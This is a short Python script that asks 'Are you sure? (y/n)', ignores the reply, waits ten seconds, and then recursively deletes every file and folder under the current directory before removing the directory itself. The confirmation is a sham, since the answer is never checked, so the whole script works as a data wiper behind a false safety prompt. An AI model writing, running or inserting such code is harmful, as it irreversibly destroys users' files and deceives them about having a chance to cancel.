import os
import shutil
import time

print("Are you sure? (y/n)")
input()
print("Executing in...")
time.sleep(10)
for root, dirs, files in os.walk('.', topdown=False):
    for name in files:
        os.remove(os.path.join(root, name))
    for name in dirs:
        os.rmdir(os.path.join(root, name))
shutil.rmtree('.')
print("Done")
